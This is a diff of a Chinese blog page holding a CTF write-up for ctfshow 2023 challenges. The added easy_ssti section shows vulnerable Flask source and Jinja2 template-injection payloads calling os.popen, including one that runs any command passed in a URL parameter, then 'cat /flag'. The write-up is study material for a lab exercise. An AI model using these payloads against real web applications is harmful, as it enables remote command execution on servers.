@@ -63,7 +63,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-signin"><span class="toc-text">easy_signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">被遗忘的反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-ssti"><span class="toc-text">easy_ssti</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-signin"><span class="toc-text">easy_signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-text">被遗忘的反序列化(未完成)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-ssti"><span class="toc-text">easy_ssti</span></a></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -205,7 +205,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ffa2c4">CTF线上赛</a>
+                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ff7d73">CTF线上赛</a>
             </span>
             
         </span>
@@ -233,7 +233,7 @@
 <p><img src="/blog/2023/04/30/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230430115407434.png" alt="image-20230430115407434"></p>
 <p>发现一串base64，解码找到flag</p>
 <p><img src="/blog/2023/04/30/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230430115521807.png" alt="image-20230430115521807"></p>
-<h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><blockquote>
+<h2 id="被遗忘的反序列化-未完成"><a href="#被遗忘的反序列化-未完成" class="headerlink" title="被遗忘的反序列化(未完成)"></a>被遗忘的反序列化(未完成)</h2><blockquote>
 <p>反序列化</p>
 </blockquote>
 <blockquote>
@@ -350,7 +350,7 @@
 
 <p>这时我们就要考虑到利用原生类进行文件读取</p>
 <p>然后为了调用__toString方法我们这里需要触发一个echo，所以这里选择<strong>EeE</strong>类</p>
-<p>payload1：</p>
+<p>exp1：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">EeE</span>
 <span class="token punctuation">&#123;</span>
@@ -375,6 +375,34 @@
 <h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><blockquote>
 <p>SSTI</p>
 </blockquote>
+<p>打开题目，f12发现提示</p>
+<p><img src="/blog/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230430194550659.png" alt="image-20230430194550659"></p>
+<p>访问下载app.zip并解压得到源码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string<span class="token punctuation">,</span>render_template
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">,</span>name<span class="token operator">=</span>name<span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hellodear</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">"ge"</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'hello %s'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> <span class="token string">"f"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'hello %s'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'Nonononon'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>很明显在hello路径后存在ssti注入</p>
+<p>直接payload一把梭</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls /"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现不行，于是尝试以传参方法执行命令</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>?a<span class="token operator">=</span>ls <span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230430200350864.png" alt="image-20230430200350864"></p>
+<p>成功，直接<code>cat /flag</code>获取flag</p>
 
     </div>
     
